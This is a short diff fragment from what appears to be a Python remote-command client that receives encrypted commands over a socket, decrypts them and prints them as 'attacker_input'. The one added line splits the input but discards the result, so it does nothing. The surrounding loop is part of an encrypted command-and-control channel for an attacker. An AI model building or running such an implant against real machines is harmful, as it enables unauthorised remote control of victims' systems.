@@ -21,6 +21,7 @@ try:
     while True:
         encrypted_command = s.recv(1024)
         _, attacker_input = asymmetric_encryption.decrypt_message(encrypted_command, priv_key)
+        attacker_input.split(' ')
         print(f"attacker_input: {attacker_input}")
         if attacker_input == 'exit':
             s.close()
